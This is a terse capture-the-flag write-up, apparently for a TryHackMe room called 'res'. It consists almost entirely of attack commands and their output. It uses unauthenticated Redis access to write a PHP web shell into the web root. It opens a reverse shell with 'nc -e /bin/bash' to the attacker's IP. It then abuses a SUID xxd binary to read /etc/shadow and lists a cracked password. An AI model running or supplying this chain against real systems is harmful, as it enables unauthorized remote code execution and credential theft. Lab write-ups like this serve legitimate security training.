# res 

> VOiD | Saturday 07 August 2021 07:10:09 PM IST

My IP : 10.17.6.109
Target IP : 10.10.152.227


The default Ubuntu document root is /var/www/html
```bash
redis-cli -h 10.10.152.227
config set dir /var/www/html
config set dbfilename redis.php
set test "<?php phpinfo(); ?>"
set test "<?php echo system($_GET['cmd']);?>"
save
```

```bash

nc -e /bin/bash 10.17.6.109 4444
cat user.txt 
thm{red1s_rce_w1thout_credent1als}

-rwsr-xr-x 1 root root        19K Mar 18  2020 /usr/bin/xxd

LFILE=/etc/shadow
/usr/bin/xxd "$LFILE" | xxd -r

beautiful1
```